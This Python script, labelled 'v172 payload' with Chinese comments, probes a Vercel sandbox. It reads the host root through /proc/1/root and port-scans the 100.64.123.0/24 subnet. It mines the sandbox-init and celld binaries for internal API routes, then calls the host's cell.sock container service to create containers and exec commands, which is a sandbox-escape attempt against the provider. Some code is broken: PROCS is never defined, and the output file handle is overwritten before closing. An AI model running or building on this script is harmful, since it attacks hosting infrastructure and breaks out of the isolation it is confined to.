# -*- coding: utf-8 -*-
"""v172 payload: 100.64 网段扫描 + sandbox-init 路由提取 + Process descriptor 完整
输出 /vercel/sandbox/v172c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess

OUT = '/vercel/sandbox/v172c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_grep(path, kws, max_size=400 * 1024 * 1024, max_hits=60, ctx=100):
    try:
        size = os.path.getsize(path)
        log('BIN %s size=%d' % (path, size))
        if size > max_size:
            return
        data = open(path, 'rb').read()
        hits = 0
        for kw in kws:
            if hits >= max_hits:
                break
            for m in re.finditer(kw, data):
                s = max(0, m.start() - ctx)
                seg = data[s:m.end() + ctx]
                printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                if printable * 10 < len(seg) * 4:
                    continue
                log('BIN %s @0x%x: %r' % (kw, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('BIN done hits=%d' % hits)
    except Exception as e:
        log('BIN EXC %s' % e)


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


# ============ 1: 网段扫描 ============
log('=== 1 netscan ===')
# fib_trie 完整 (路由/网段)
try:
    fib = open('/proc/1/net/fib_trie').read()
    log('FIB len=%d: %s' % (len(fib), fib[:2500]))
except Exception as e:
    log('FIB EXC %s' % e)
# 网关
try:
    for ln in open('/proc/1/net/route').read().splitlines():
        log('RT %s' % ln)
except Exception as e:
    log('RT EXC %s' % e)

# 同网段扫描 (100.64.123.0/24, 常用端口)
ip_base = '100.64.123.'
ports = [22, 80, 443, 2375, 8080, 3000, 5000, 6443, 10250, 2379, 7000, 8000, 9090, 9100, 22, 53]
t0 = time.time()
hits = []
for i in range(1, 255):
    ip = ip_base + str(i)
    for p in [80, 443, 22, 8080, 3000]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.35)
            if s.connect_ex((ip, p)) == 0:
                hits.append((ip, p))
                log('NET HIT %s:%d' % (ip, p))
            s.close()
        except Exception:
            pass
    if time.time() - t0 > 150:
        log('scan timeout partial')
        break
log('scan done hits=%s took=%.0fs' % (hits, time.time() - t0))

# ============ 2: sandbox-init 路由提取 ============
log('=== 2 sbi routes ===')
SBI = '/proc/1/root/volumes/run/vercel/share/sandbox-init'
bin_grep(SBI, [rb'init\.sock', rb'/v1/[a-z_/]+', rb'/api/[a-z_/]+', rb'http\.Handler',
               rb'HandleFunc', rb'serveMux', rb'/health[a-z]*', rb'/[a-z]+/[a-z]+/(start|stop|status)'],
         max_hits=50, ctx=80)

# ============ 3: Process descriptor 完整 ============
log('=== 3 process proto full ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    i = data.find(b'\x13types/process.proto\x12\x14vercel.hive.types.v1')
    if i > 0:
        seg = data[i - 50:i + 2500]
        for j in range(0, len(seg), 430):
            log('PP %r' % seg[j:j + 430])
except Exception as e:
    log('PP EXC %s' % e)

# ============ 4: Exec + Wait 验证 ============
log('=== 4 exec wait ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    time.sleep(1)
    f = find_proc(['yes'])
    log('yes pid=%s' % (f[0] if f else None))
    # Exec 立即退出的命令
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/true'}}).encode()
    st3, pay3 = raw_req(CELL, '%s/Exec' % CTRS, body, t=6)
    log('Exec true -> %s %r' % (st3, pay3[:200]))
    mm = re.search(rb'processId["\s:]+([A-Za-z0-9_-]+)', pay3)
    proc_id = mm.group(1).decode() if mm else ''
    log('procId=%s' % proc_id)
    # Wait 短超时看是否返回退出码
    if proc_id:
        st4, pay4 = raw_req(CELL, '%s/Wait' % PROCS,
                            json.dumps({'process_id': proc_id}).encode(), t=5)
        log('Wait true -> %s %r' % (st4, pay4[:300]))
        # 用 32hex 部分
        hexpart = proc_id.replace('hvcp_', '')[:32]
        st5, pay5 = raw_req(CELL, '%s/Wait' % PROCS,
                            json.dumps({'process_id': hexpart}).encode(), t=5)
        log('Wait hex32 -> %s %r' % (st5, pay5[:300]))

log('V172_DONE')
f.close()
